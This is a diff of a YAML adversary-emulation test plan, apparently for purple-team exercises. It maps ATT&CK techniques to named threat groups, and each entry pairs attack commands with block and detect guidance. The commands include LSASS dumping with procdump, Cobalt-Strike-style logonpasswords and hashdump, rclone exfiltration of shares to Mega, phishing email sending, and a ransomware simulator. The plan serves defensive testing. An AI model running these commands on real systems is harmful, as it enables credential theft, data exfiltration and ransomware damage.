@@ -10,10 +10,10 @@ Initial Access:
     tid: T1566.001
     x_vectr_id: 84a1b020-370b-4eeb-9f0e-877a9e6d5419
     groups:
-    - Kimsuky
-    - QakBot
     - Bumblebee
     - BlackTech
+    - QakBot
+    - Kimsuky
   guidance:
   - PS> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject {{ subject }} -Body {{ body }} -To {{ target }} -From {{ noreply@maildomain }} -Attachments {{ attachment }}
   block:
@@ -32,10 +32,10 @@ Initial Access:
     tid: T1566.001
     x_vectr_id: ab24f93b-92b9-4fdc-a0c4-13ab8df96851
     groups:
-    - Kimsuky
-    - QakBot
     - Bumblebee
     - BlackTech
+    - QakBot
+    - Kimsuky
   guidance:
   - PS> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject {{ subject }} -Body {{ body }} -To {{ target }} -From {{ noreply@maildomain }} -Attachments {{ attachment }}
   block:
@@ -54,10 +54,10 @@ Initial Access:
     tid: T1566.001
     x_vectr_id: f44e8e3d-5cb2-4f23-86f0-bdfb98fb6c99
     groups:
-    - Kimsuky
-    - QakBot
     - Bumblebee
     - BlackTech
+    - QakBot
+    - Kimsuky
   guidance:
   - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject {{ subject }} -Body {{ body }} -To {{ target }} -From {{ from }} -Attachments {{ attachment }}
   block:
@@ -127,9 +127,9 @@ Execution:
     tid: T1204.002
     x_vectr_id: 45f30aa4-cb46-4522-806c-6f1144a86735
     groups:
-    - Conti
     - Bazar
     - QakBot
+    - Conti
   platforms:
   - windows
   block:
@@ -154,9 +154,9 @@ Execution:
     tid: T1204.002
     x_vectr_id: 519c429d-d08d-4a9b-87f3-496ad304b234
     groups:
-    - Conti
     - Bazar
     - QakBot
+    - Conti
   platforms:
   - windows
   block:
@@ -225,8 +225,8 @@ Defense Evasion:
     x_vectr_id: 4d421c9b-e8d7-407f-bf39-5120d5760417
     groups:
     - Kimsuky
-    - Conti
     - Bazar
+    - Conti
   platforms:
   - windows
   guidance:
@@ -250,9 +250,9 @@ Defense Evasion:
     x_vectr_id: 492043f3-1847-4492-946e-137db9e54f2d
     groups:
     - Kimsuky
-    - Conti
     - Bazar
     - QakBot
+    - Conti
   platforms:
   - windows
   guidance:
@@ -353,9 +353,9 @@ Command and Control:
     tid: T1105
     x_vectr_id: 9755cd8b-5212-4331-8c6e-afb27404a4b9
     groups:
-    - Conti
-    - Bazar
     - BlackTech
+    - Bazar
+    - Conti
   block:
   - Signatures for known bad tools are blocked by network security controls such as an ID/PS
   detect:
@@ -375,8 +375,8 @@ Command and Control:
     x_vectr_id: 10f6c44e-b862-4553-bc55-68f6d941bcfb
     groups:
     - Bumblebee
-    - Conti
     - Bazar
+    - Conti
   block:
   - Block the installation and usage of unapproved third-party utilities via application control software
   - Connections to known remote access service domains/IPs are blocked
@@ -396,13 +396,13 @@ Command and Control:
     tid: T1071.001
     x_vectr_id: 3ed2f449-744b-48c3-80d2-854386e446a0
     groups:
-    - Bumblebee
-    - QakBot
-    - BlackTech
-    - Conti
     - APT41
-    - Kimsuky
+    - Conti
+    - Bumblebee
     - Bazar
+    - Kimsuky
+    - BlackTech
+    - QakBot
   block:
   - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
   detect:
@@ -423,13 +423,13 @@ Command and Control:
     tid: T1071.001
     x_vectr_id: 38064494-0d58-4f48-bce8-b5b7ea7db3da
     groups:
-    - Bumblebee
-    - QakBot
-    - BlackTech
-    - Conti
     - APT41
-    - Kimsuky
+    - Conti
+    - Bumblebee
     - Bazar
+    - Kimsuky
+    - BlackTech
+    - QakBot
   block:
   - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
   detect:
@@ -476,9 +476,9 @@ Credential Access:
     - https://processhacker.sourceforge.io/
     groups:
     - Kimsuky
-    - Conti
-    - Bazar
     - Bumblebee
+    - Bazar
+    - Conti
   platforms:
   - windows
   prerequisites:
@@ -505,15 +505,15 @@ Credential Access:
     x_vectr_id: fc8a1bff-bc19-46fe-bd73-63fe6dce45b0
     groups:
     - Kimsuky
-    - Conti
-    - Bazar
     - Bumblebee
+    - Bazar
+    - Conti
   platforms:
   - windows
   prerequisites:
   - local_admin
   guidance:
-  - beacon> logonpasswords
+  - implant> logonpasswords
   block:
   - Suspicious process execution/behavior blocked by endpoint security tool
   - Enable additional LSA protections or Windows Credential Guard to prevent traditional process dumping of LSASS
@@ -523,7 +523,7 @@ Credential Access:
   - edr:telemetry
   controls:
   - EDR
-- name: Extract LSASS Process Memory via Sysinternals ProcDump
+- name: Dump LSASS memory using Sysinternals ProcDump
   description: Use ProcDump from Sysinternals to dump LSASS process memory
   metadata:
     isv: 1
@@ -534,9 +534,9 @@ Credential Access:
     - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
     groups:
     - Kimsuky
-    - Conti
-    - Bazar
     - Bumblebee
+    - Bazar
+    - Conti
   platforms:
   - windows
   prerequisites:
@@ -545,15 +545,14 @@ Credential Access:
   - CMD> procdump -ma lsass.exe dump
   block:
   - Suspicious process execution/behavior blocked by endpoint security tool
-  - Enable additional LSA protections or Windows Credential Guard to prevent traditional process dumping of LSASS
+  - Enable Credential Guard to prevent traditional process dumping of LSASS
   detect:
-  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
+  - Suspicious process execution/behavior is detected by endpoint security tool or triggers alert in SIEM based on telemetry
   logs:
   - edr:telemetry
-  - process_create
   controls:
-  - Endpoint Protection
   - SIEM
+  - Endpoint Protection
 - name: Extract local user credentials using hashdump
   description: Use hashdump to extract local user credentials from the SAM
   metadata:
@@ -562,14 +561,14 @@ Credential Access:
     tid: T1003.002
     x_vectr_id: b2cced6c-b8b1-4ee8-93d9-4f5dc4b61afb
     groups:
-    - Bumblebee
     - APT41
+    - Bumblebee
   platforms:
   - windows
   prerequisites:
   - local_admin
   guidance:
-  - beacon> hashdump
+  - implant> hashdump
   block:
   - Suspicious process execution/behavior blocked by endpoint security tool
   detect:
@@ -589,8 +588,8 @@ Credential Access:
     tid: T1003.002
     x_vectr_id: 943ecdc7-c828-41fa-acf7-6c216e87dca4
     groups:
-    - Bumblebee
     - APT41
+    - Bumblebee
   platforms:
   - windows
   prerequisites:
@@ -647,7 +646,7 @@ Credential Access:
   controls:
   - Endpoint Protection
   - SIEM
-- name: Extract Browser Credentials
+- name: Extract browser credentials
   description: Extract credentials information (saved passwords, sessions) from browser
   metadata:
     isv: 1
@@ -683,10 +682,10 @@ Discovery:
     tid: T1087.002
     x_vectr_id: b901e32f-67c0-4449-a120-ea820384e9e6
     groups:
-    - Bumblebee
-    - Conti
-    - Bazar
     - APT41
+    - Bumblebee
+    - Bazar
+    - Conti
   platforms:
   - windows
   guidance:
@@ -709,10 +708,10 @@ Discovery:
     tid: T1087.002
     x_vectr_id: 81ed48d0-a13c-40db-9f11-6675ef57d41e
     groups:
-    - Bumblebee
-    - Conti
-    - Bazar
     - APT41
+    - Bumblebee
+    - Bazar
+    - Conti
   guidance:
   - cmd> setspn -T {{ domain }} -Q */*
   block:
@@ -727,6 +726,35 @@ Discovery:
   - SIEM
   - Endpoint Protection
   - UEBA
+- name: AdFind AD enumeration
+  description: Use ADFind to perform enumeration of domain resources
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1087.002
+    x_vectr_id: 76ce7dbe-ecd8-47bb-8ca6-68067c508fa1
+    x_tools:
+    - AdFind
+    - https://github.com/2XXE-SRA/payload_resources/blob/master/batch/bazar_adf.bat
+    groups:
+    - APT41
+    - Bumblebee
+    - Bazar
+    - Conti
+  guidance:
+  - cmd> {{ bat_file }}
+  block:
+  - Block the installation and usage of unapproved third-party utilities via application control software
+  detect:
+  - UEBA detects spike in domain related activity by user due to enumeration activities
+  - Enable object logging on Active Directory object and trigger an alert when multiple high-value objects are accessed by a single source in a short period
+  - https://blog.blacklanternsecurity.com/p/detecting-ldap-recoannaissance
+  logs:
+  - winevent
+  controls:
+  - SIEM
+  - UEBA
+  - Application Control
 - name: Domain trust discovery via nltest.exe
   description: Identify domain trust relationships using nltest.exe
   metadata:
@@ -736,8 +764,8 @@ Discovery:
     x_vectr_id: 4266c26e-0470-4b97-8dc3-1d24fe35f586
     groups:
     - Bumblebee
-    - Conti
     - Bazar
+    - Conti
   platforms:
   - windows
   guidance:
@@ -760,37 +788,12 @@ Discovery:
     tid: T1135
     x_vectr_id: 763f909f-d298-48c6-a2ee-3975d0a0180c
     groups:
-    - Conti
     - Bazar
+    - Conti
   platforms:
   - windows
   guidance:
   - cmd> net.exe view /all
-  block:
-  - Suspicious process execution/behavior blocked by endpoint security tool
-  detect:
-  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
-  logs:
-  - edr:telemetry
-  - process_create
-  controls:
-  - Endpoint Protection
-  - SIEM
-- name: Remote system discovery with net.exe
-  description: Identify remote systems and information using net.exe
-  metadata:
-    isv: 1
-    tactic: TA0007
-    tid: T1018
-    x_vectr_id: a42c79f3-a436-4ced-9c93-13b0ea55d315
-    groups:
-    - Bumblebee
-    - APT41
-    - BlackTech
-  platforms:
-  - windows
-  guidance:
-  - cmd> net.exe view
   block:
   - Suspicious process execution/behavior blocked by endpoint security tool
   detect:
@@ -904,8 +907,8 @@ Lateral Movement:
     x_vectr_id: 0735ef7e-438f-4fc9-a656-7d11d73fbc61
     groups:
     - Bumblebee
-    - Conti
     - Bazar
+    - Conti
   platforms:
   - windows
   prerequisites:
@@ -933,10 +936,10 @@ Lateral Movement:
     tid: T1021.003
     x_vectr_id: 3c337f53-d086-4f2f-818a-08fb1a1c5f79
     groups:
-    - Bumblebee
-    - Conti
-    - Bazar
     - APT41
+    - Bumblebee
+    - Bazar
+    - Conti
   platforms:
   - windows
   prerequisites:
@@ -995,8 +998,8 @@ Persistence:
     tid: T1547.001
     x_vectr_id: ec045315-c164-4a55-b255-bbd6c0ae8d5d
     groups:
-    - Kimsuky
     - BlackTech
+    - Kimsuky
   platforms:
   - windows
   guidance:
@@ -1020,8 +1023,8 @@ Persistence:
     tid: T1547.001
     x_vectr_id: ffcb2405-241e-4fc4-a549-4b94e07d6fe0
     groups:
-    - Kimsuky
     - BlackTech
+    - Kimsuky
   platforms:
   - windows
   guidance:
@@ -1044,8 +1047,8 @@ Persistence:
     tid: T1053.005
     x_vectr_id: 20a6dace-d801-42f5-b659-6cf91e39d273
     groups:
-    - Kimsuky
     - Bumblebee
+    - Kimsuky
   platforms:
   - windows
   prerequisites:
@@ -1087,7 +1090,7 @@ Persistence:
   controls:
   - Endpoint Protection
   - SIEM
-- name: New local administrator
+- name: Persist via new local administrator
   description: Create a new local user then add them to the "Administrators" group using the builtin net.exe
   metadata:
     isv: 1
@@ -1095,8 +1098,8 @@ Persistence:
     tid: T1136.001
     x_vectr_id: 0bcb2080-b140-4a1c-9e79-8512a18882d8
     groups:
-    - Kimsuky
     - Bumblebee
+    - Kimsuky
   platforms:
   - windows
   prerequisites:
@@ -1127,8 +1130,8 @@ Exfiltration:
     x_tools:
     - https://rclone.org/
     groups:
-    - Conti
     - Bazar
+    - Conti
   guidance:
   - CMD> rclone.exe copy --max-age 2y "{{ network_share }}" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M
   block:
@@ -1155,7 +1158,7 @@ Exfiltration:
     groups:
     - Kimsuky
   guidance:
-  - beacon> download {{ file }}
+  - implant> download {{ file }}
   block:
   - Sensitive data sent over common network protocol is blocked by proxy or DLP tool
   - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
@@ -1249,8 +1252,8 @@ Impact:
     x_tools:
     - https://github.com/2XXE-SRA/payload_resources/tree/master/coldencryptor
     groups:
-    - Conti
     - Bazar
+    - Conti
   guidance:
   - cmd> coldcryptor.exe run {{ extension }}
   block:
